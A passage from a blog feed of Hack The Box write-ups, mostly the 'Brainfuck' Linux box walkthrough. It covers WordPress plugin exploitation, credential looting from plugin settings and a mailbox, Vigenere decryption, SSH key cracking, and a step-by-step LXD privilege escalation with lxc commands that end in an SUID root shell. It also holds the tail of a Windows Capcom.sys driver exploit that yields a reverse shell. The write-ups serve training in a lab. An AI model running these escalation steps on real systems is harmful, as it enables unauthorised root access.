<p>And proceed to <strong>load</strong> <code class="language-plaintext highlighter-rouge">Capcom.sys</code> into the <em>writable</em> <code class="language-plaintext highlighter-rouge">HKCU:\System\CurrentControlSet</code> <strong>registry path</strong> using <code class="language-plaintext highlighter-rouge">EoPLoadDriver.exe</code> and naming it <code class="language-plaintext highlighter-rouge">KillerDriver</code> for dramatic effect XD</p>

<p><em>With the driver now in the kernel,</em> we <strong>exploit it</strong> with <code class="language-plaintext highlighter-rouge">ExploitCapcom.exe</code> which <strong>runs</strong> the <code class="language-plaintext highlighter-rouge">rev.exe</code> to <strong>give us a nice reverse shell :D</strong></p>

<p><img src="/assets/Fuse/killer-driver.jpg" alt="" /></p>

<p><strong><em>I guess we blew up a FUSE :P</em></strong></p>

<p><strong>…</strong></p>

<p><strong>Ahem! It was a good box :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Insane] - Brainfuck</title><link href="http://localhost:4000/2022/08/17/Brainfuck.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Insane] - Brainfuck" /><published>2022-08-17T00:00:00+02:00</published><updated>2022-08-17T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/17/Brainfuck</id><content type="html" xml:base="http://localhost:4000/2022/08/17/Brainfuck.html"><![CDATA[<p><img src="/assets/Brainfuck/Brainfuck.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li>A <strong>Linux</strong> box where we find <strong>email ports (SMTP/POP/IMAP)</strong> open as well as <strong>two HTTPS websites</strong> (we discovered them from the <strong>SSL certificate Subject Alternative Name</strong> field)</li>
  <li>One website had a <strong>Wordpress blog</strong> which happened to have a <strong><em>vulnerable component</em></strong> that enabled us to impersonate the <code class="language-plaintext highlighter-rouge">admin</code> user.</li>
  <li><em>After failing to get code execution using traditional ways</em> (<strong><em>editing Wordpress themes and uploading malicious plugins</em></strong>), we search more to <strong>find email credentials for the <code class="language-plaintext highlighter-rouge">orestis</code> user in the installed SMTP plugin.</strong></li>
  <li>We <strong>configure a mail client with IMAP</strong> and <strong>retrieve the mailbox contents</strong> for the <code class="language-plaintext highlighter-rouge">orestis</code> user to <strong>gain another set of credentials for the other website (a forum)</strong>.</li>
  <li><em>After logging in,</em> <strong>we find an accouncement</strong> where the <code class="language-plaintext highlighter-rouge">administrator</code> <strong>mentions that SSH password-based authentication has been disabled in favor of key-based login.</strong></li>
  <li><em>Since the <code class="language-plaintext highlighter-rouge">orestis</code> user</em> <strong><em>lost his key</em></strong>, he is now <strong>locked out</strong> and <strong>is looking to get his key for access.</strong></li>
  <li>The <code class="language-plaintext highlighter-rouge">administrator</code> says <strong>he won’t provide the SSH key in the discussion thread because it would be visible to all forum members</strong>. So they <strong>switch over to an encrypted one</strong>.</li>
  <li><em>Looking at the</em> <strong>cipher text</strong> <em>on that thread</em>, we <strong>do some research to recognize the cipher in use</strong>. We find out it’s a <strong>Vigenere Cipher</strong> and <strong><em>are able to figure out the key.</em></strong></li>
  <li><em>After</em> <strong><em>decrypting the messages on the thread</em></strong>, <strong>we get a URL for a passphrase-protected SSH key</strong>. One we crack using <code class="language-plaintext highlighter-rouge">john</code>.</li>
  <li>We finally login as the <code class="language-plaintext highlighter-rouge">orestis</code> user to find out <strong>he’s a member of the <code class="language-plaintext highlighter-rouge">lxd</code> group</strong>. <strong>This enables us to escalate our privileges to <code class="language-plaintext highlighter-rouge">root</code> due the insecure features of LXD.</strong></li>
</ul>

<hr />

<h2 id="nmap-for-the-roadmap">NMAP for the roadmap</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER TOP PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login Pre-login IMAP4rev1 have LOGIN-REFERRALS ID capabilities IDLE more OK SASL-IR ENABLE AUTH=PLAINA0001 listed LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p><strong><em>Looking at the nmap scan results</em></strong>, we notice:</p>
<ol>
  <li><strong>SSH version &lt; 7.7</strong> which <strong>allows for user enumeration</strong> (<em>we might need that to confirm some users’ existence on the box</em>)</li>
  <li><strong>Mail ports: 25, 110 &amp; 143 for SMTP, POP and IMAP</strong> (<strong>SMTP</strong> = we <strong>can send malicious emails</strong> and <strong>launch client-side attacks</strong> while <strong>IMAP</strong> and <strong>POP3</strong> can <strong>give us access to user mailboxes if we have credentials</strong>)</li>
  <li><strong>HTTPS</strong> on port 443 is a nice <strong>web-based attack surface</strong> for us to explore</li>
</ol>

<p>But we notice that the <strong>nmap default script</strong> gave us <strong>a couple of host names</strong> in the <code class="language-plaintext highlighter-rouge">commonName</code> and <code class="language-plaintext highlighter-rouge">Subject Alternative Name</code> fields:</p>
<ul>
  <li><strong>brainfuck.htb</strong></li>
  <li><strong>www.brainfuck.htb</strong></li>
  <li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
</ul>

<p><strong>We add those to our</strong> <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<p><img src="/assets/Brainfuck/setting-etc-hosts.jpg" alt="" /></p>

<h2 id="checking-out-the-websites">Checking out the websites</h2>
<p>We take a look at <strong>www.brainfuck.htb</strong> to find a <strong>Wordpress blog</strong></p>

<p><img src="/assets/Brainfuck/wordpress-first-look.jpg" alt="" /></p>

<p><strong>It’s rich with information:</strong></p>
<ol>
  <li>we find <strong>two usernames</strong>: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">orestis</code></li>
  <li>we find <strong>a note about integration with SMTP</strong>. <em>Possibly a</em> <strong><em>hint</em></strong></li>
  <li>we notice <strong>a link to “open a ticket”</strong>. This could be a <strong>Wordpress plugin</strong> with exploitable functionalities.</li>
</ol>

<h2 id="enumerating-wordpress">Enumerating Wordpress</h2>
<p><em>At this point,</em> it’s both a <strong><em>quick and easy check</em></strong> to run <code class="language-plaintext highlighter-rouge">wpscan</code>. It’s <strong>specialized for scanning Wordpress</strong> and <strong>would give us tons of information on it</strong>.</p>

<p><strong><em>Running it like below:</em></strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> https://brainfuck.htb/ <span class="nt">-e</span> ap,at,tt,cb,dbe,u <span class="nt">--disable-tls-checks</span>
</code></pre></div></div>

<p>would enable us to <strong>enumerate</strong> (<code class="language-plaintext highlighter-rouge">-e</code>):</p>
<ul>
  <li>All plugins <code class="language-plaintext highlighter-rouge">ap</code></li>
  <li>All themes <code class="language-plaintext highlighter-rouge">at</code></li>
  <li>Timthumbs <code class="language-plaintext highlighter-rouge">tt</code></li>
  <li>Config backups <code class="language-plaintext highlighter-rouge">cb</code></li>
  <li>Database exports <code class="language-plaintext highlighter-rouge">dbe</code></li>
  <li>And, Wordpress users <code class="language-plaintext highlighter-rouge">u</code></li>
</ul>

<p><em>Looking at the results,</em> we find <strong>something interesting:</strong></p>

<p><img src="/assets/Brainfuck/wp-plugin-discovered.jpg" alt="" /></p>

<p>We do a search on <a href="/assets/Brainfuck/https://www.exploit-db.com/">Exploit-DB</a> to find that <strong>there is couple of verified exploits that match the version we have</strong>:</p>

<p><img src="/assets/Brainfuck/exploit-db-plugin.jpg" alt="" /></p>

<p><em>At first,</em> we check out <strong>the SQL injection one</strong>. But we find out that <strong>it requires at least one valid user</strong>:</p>

<p><img src="/assets/Brainfuck/vuln1-user-access-required.jpg" alt="" /></p>

<p><em>Luckily however,</em> the second one <strong>doesn’t require authentication:</strong></p>

<p><img src="/assets/Brainfuck/vuln2-user-access-not-required.jpg" alt="" /></p>

<p>And <strong>the PoC seems straightforward</strong>. Just a <strong>form we have to submit:</strong></p>

<p><img src="/assets/Brainfuck/vuln2-poc.jpg" alt="" /></p>

<p>We <strong>edit the exploit</strong> to <strong>match the Wordpress URL</strong> like below:</p>

<p><img src="/assets/Brainfuck/html-exploit-edited.jpg" alt="" /></p>

<p>And <strong>open the html with Firefox:</strong></p>

<p><img src="/assets/Brainfuck/html-exploit-firefox.jpg" alt="" /></p>

<p><em>After submitting the form,</em> we notice that <strong>the response gives us a bunch of cookies</strong></p>

<p><img src="/assets/Brainfuck/exploit-request-and-response.jpg" alt="" /></p>

<p>And we <strong>confirm that the exploit works</strong> after visiting the <strong>website’s main page and finding a session with <code class="language-plaintext highlighter-rouge">administrator</code></strong></p>

<p><img src="/assets/Brainfuck/html-exploit-working.jpg" alt="" /></p>

<p><strong>Great!</strong> <em>but even though the exploit worked</em>, the <code class="language-plaintext highlighter-rouge">administrator</code> user <strong><em>didn’t have much access.</em></strong></p>

<p><img src="/assets/Brainfuck/wp-administrator-low-access.jpg" alt="" /></p>

<p><strong><em>Knowing of the other</em></strong> <code class="language-plaintext highlighter-rouge">admin</code> <strong><em>user from both the homepage and</em></strong> <code class="language-plaintext highlighter-rouge">wpscan</code>, we <strong>used the exploit to gain access with the</strong> <code class="language-plaintext highlighter-rouge">admin</code> <strong>user instead.</strong></p>

<p><img src="/assets/Brainfuck/wp-found-users.jpg" alt="" /></p>

<h2 id="trying-to-abuse-wordpress-with-the-admin-account">Trying to abuse Wordpress with the Admin account</h2>
<p><em>After logging in as</em> <code class="language-plaintext highlighter-rouge">admin</code>, we find out that <strong>we have access to much more things</strong> than with <code class="language-plaintext highlighter-rouge">administrator</code></p>

<p><img src="/assets/Brainfuck/wp-admin-access.jpg" alt="" /></p>

<p><em>Because</em> <strong>Wordpress</strong> <em>themes use</em> <strong>PHP</strong>, we try to <strong>edit the templates</strong> and <strong>add a reverse shell.</strong></p>

<p>But <strong>our user didn’t seem to have that access.</strong></p>

<p><img src="/assets/Brainfuck/cant-edit-wp-themes.jpg" alt="" /></p>

<p>We instead try to <strong>upload a malicious plugin</strong>. <strong>No luck here either :/</strong></p>

<p><img src="/assets/Brainfuck/cant-upload-plugin.jpg" alt="" /></p>

<p><strong><em>Having phased out the traditional ways of exploiting Wordpress</em></strong>, we look around for other venues.</p>

<p>We <strong>find another plugin: Easy WP SMTP</strong> <strong><em>(the one hinted about in the home page)</em></strong></p>

<p><img src="/assets/Brainfuck/smtp-plugin-discovered.jpg" alt="" /></p>

<p><em>After going into its</em> <strong><em>settings</em></strong>, we notice <strong>a saved password</strong> that <strong>we can extract from the html</strong></p>

<p><img src="/assets/Brainfuck/smtp-password-looted.jpg" alt="" /></p>

<h2 id="rummaging-through-peoples-mailboxes-d">Rummaging through people’s mailboxes :D</h2>

<p><strong><em>Given the available IMAP service on port 143,</em></strong> we can go through the <code class="language-plaintext highlighter-rouge">orestis</code> user’s <strong>mailbox.</strong></p>

<p>We will <strong>install</strong> and <strong>configure a mail client</strong> called <code class="language-plaintext highlighter-rouge">evolution</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>evolution
</code></pre></div></div>

<p><em>After starting it,</em> we go to <strong>Edit &gt; Accounts</strong></p>

<p><img src="/assets/Brainfuck/evo-accounts.jpg" alt="" /></p>

<p><em>After selecting the</em> <strong>“Mail Account”</strong> <em>option</em>, we <strong>proceed through the account setup process</strong></p>

<p><img src="/assets/Brainfuck/evo-identity.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-rev-mail.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-send-mail.jpg" alt="" /></p>

<p><img src="/assets/Brainfuck/evo-password.jpg" alt="" /></p>

<p>We <strong>successfully log in</strong> to find <strong>another set of credentials</strong> waiting for us in the <strong>inbox</strong> :D</p>

<p><img src="/assets/Brainfuck/forum-creds-in-mailbox.jpg" alt="" /></p>

<h2 id="visiting-the-forum">Visiting the Forum</h2>

<p><em>Going into the</em> <strong>forum</strong> at <code class="language-plaintext highlighter-rouge">https://sup3rs3cr3t.brainfuck.htb/</code>, we see nothing on the main page except for a <strong>test thread</strong></p>

<p><img src="/assets/Brainfuck/test-thread.jpg" alt="" /></p>

<p>We log in as <code class="language-plaintext highlighter-rouge">orestis</code> to find <strong>two more threads</strong>:</p>

<p><img src="/assets/Brainfuck/2-more-threads.jpg" alt="" /></p>

<p><strong><em>On the SSH Access thread:</em></strong></p>

<p><img src="/assets/Brainfuck/ssh-access-thread.jpg" alt="" /></p>

<p>It seems like <strong>the server administrator changed the SSH settings</strong> to <strong>only allow key-based authentication.</strong></p>

<p><em>This, however,</em> <strong>locked out</strong> the <code class="language-plaintext highlighter-rouge">orestis</code> user who now <strong>wants his key to regain access.</strong></p>

<p><strong><em>But, since exposing they key on the forum isn’t feasable,</em></strong> they decide to <strong>move to an encrypted thread</strong></p>

<p><img src="/assets/Brainfuck/encrypted-thread.jpg" alt="" /></p>

<p><strong>It’s gibberish here XD</strong></p>

<p>But the <strong>protocol notation</strong> <code class="language-plaintext highlighter-rouge">://</code> indicates that this <strong>might be a URL</strong>. Specially because <strong>the number of characters</strong> in <code class="language-plaintext highlighter-rouge">mnvze</code> <strong>matches the number of characters in</strong> <code class="language-plaintext highlighter-rouge">https</code>.</p>

<p><em>And since this thread is about</em> <code class="language-plaintext highlighter-rouge">orestis</code> <strong><em>receiving SSH access</em></strong>, we’re <strong>determined to figure this out :)</strong></p>

<p><em>But knowing i’m no wizard when it comes to</em> <strong><em>Cryptography</em></strong>, I <strong>seek Google’s help with a search: “detect cipher text”</strong></p>

<p><img src="/assets/Brainfuck/google-detect-cipher.jpg" alt="" /></p>

<p>I <strong>choose the first search result</strong> and paste in <strong>the longest line of text</strong>. This is <strong>to give the website a good sample for analysis</strong>.</p>

<p>Here were the results:</p>

<p><img src="/assets/Brainfuck/cipher-analysis.jpg" alt="" /></p>

<p>The tool <strong>is most confident in the cipher being of the “Vigenere type”.</strong></p>

<p>So I <strong>switch over</strong> to <strong>the Vigenere decryption page</strong> and <strong>select “Automatic Decryption”</strong></p>

<p><img src="/assets/Brainfuck/automatic-decryption-results.jpg" alt="" /></p>

<p>The results on the left showed that <strong>the tool is trying decryption keys like</strong>:</p>
<ul>
  <li>FUCKMYBBOIN</li>
  <li>FUCKMYLSOIN</li>
  <li>FUCKMYBBNIN</li>
  <li>FUCKMYBBCHN</li>
</ul>

<p>And <strong>getting some really coherent results</strong>. <strong><em>But not quite fully.</em></strong></p>

<p>So I decide to <strong>try some english words</strong> <strong><em>(since the sentence is in natural language).</em></strong></p>

<p><em>Following the machine’s naming,</em> <strong>I tried “FUCKMYBRAIN” as a key.</strong></p>

<p><img src="/assets/Brainfuck/cipher-decrypted.jpg" alt="" /></p>

<p><strong>It worked! XD</strong></p>

<h2 id="ssh-access-as-orestis">SSH Access as Orestis</h2>

<p><em>Visiting the url,</em> we <strong>get a private SSH key:</strong></p>

<p><img src="/assets/Brainfuck/ssh-key-found.jpg" alt="" /></p>

<p><strong>we’re asked for a passphrase</strong> when trying to use it.</p>

<p><img src="/assets/Brainfuck/passphrase-required.jpg" alt="" /></p>

<p>We <strong>convert the key to john format and crack it</strong> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code></p>

<p><img src="/assets/Brainfuck/key-cracked.jpg" alt="" /></p>

<p><strong>then login:</strong></p>

<p><img src="/assets/Brainfuck/in-as-orestis.jpg" alt="" /></p>

<h2 id="lxd-privilege-escalation">LXD Privilege Escalation</h2>

<p><em>Right after logging in,</em> and <strong><em>from the previous screenshot</em></strong>, we notice that <code class="language-plaintext highlighter-rouge">orestis</code> <strong>is part of the</strong> <code class="language-plaintext highlighter-rouge">lxd</code> <strong>group.</strong></p>

<p><img src="/assets/Brainfuck/lxd-group.jpg" alt="" /></p>

<p><em>Following the</em> <a href="/assets/Brainfuck/https://www.hackingarticles.in/lxd-privilege-escalation/">article</a> <em>from the awesome</em> <strong>Hacking Articles</strong> <em>blog</em>, we know that we can <strong>escalate our privileges</strong> using that membership.</p>

<p>Here’s a quoted <strong>brief description:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A member of the local "lxd" group can instantly escalate the privileges to root on the host operating system.
This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password.
The vulnerability exists even with the LXD snap package.

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post.
This gives a low-privilege user root access to the host filesystem. 
</code></pre></div></div>

<p>we first <strong>clone the</strong> <code class="language-plaintext highlighter-rouge">lxd-alpine-builder</code> <strong>repository</strong> and <strong>build the alpine image</strong> with the <code class="language-plaintext highlighter-rouge">build-alpine</code> <strong>script</strong> to get the <code class="language-plaintext highlighter-rouge">.tar.gz</code> files below:</p>

<p><img src="/assets/Brainfuck/building-alpine.jpg" alt="" /></p>

<p>And we <strong>transfer one over to the remote</strong> <code class="language-plaintext highlighter-rouge">/tmp</code> <strong>folder</strong></p>

<p><img src="/assets/Brainfuck/transfer-alpine.jpg" alt="" /></p>

<p><strong><em>To escalate our privileges,</em></strong> we:</p>

<ol>
  <li>Will first <strong>import the image</strong> and give it a suitable alias of <code class="language-plaintext highlighter-rouge">killerimage</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import alpine-v3.16-x86_64-20220816_1459.tar.gz <span class="nt">--alias</span> killerimage
</code></pre></div>    </div>
  </li>
  <li><strong>Verify that the import was a success</strong>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image list
</code></pre></div>    </div>
  </li>
  <li>Then <strong>initialize the image</strong> and <strong>create a container</strong> with the <code class="language-plaintext highlighter-rouge">security.privileged</code> option set to <code class="language-plaintext highlighter-rouge">true</code>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init killerimage brainfucked <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
</code></pre></div>    </div>
  </li>
  <li><strong>And proceed to mount the host’s root filesystem</strong> into the <code class="language-plaintext highlighter-rouge">/mnt/root</code> directory <strong>within the container</strong>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc config device add brainfucked mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Afterwards, start the container</strong> and <strong>execute a bourne shell</strong> (<code class="language-plaintext highlighter-rouge">sh</code>) (since it <strong><em>preserves the permission by default</em></strong>)
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc start brainfucked
lxc <span class="nb">exec </span>brainfucked /bin/sh
</code></pre></div>    </div>
  </li>
  <li><strong><em>And, with the root privilege</em></strong>, we will <strong>create an SUID bash</strong> in <code class="language-plaintext highlighter-rouge">/tmp</code> on the host
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /mnt/root/bin/bash /mnt/root/tmp/bash
<span class="nb">chmod</span> +s /mnt/root/tmp/bash
</code></pre></div>    </div>
  </li>
  <li><strong><em>After exiting the container shell,</em></strong> we can <strong>run the the SUID bash</strong> with the <code class="language-plaintext highlighter-rouge">-p</code> flag to <strong>execute as root</strong></li>
</ol>

<p><strong>It should all look like this:</strong></p>

<p><img src="/assets/Brainfuck/rooted.jpg" alt="" /></p>

<p><strong>A piece of cake :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>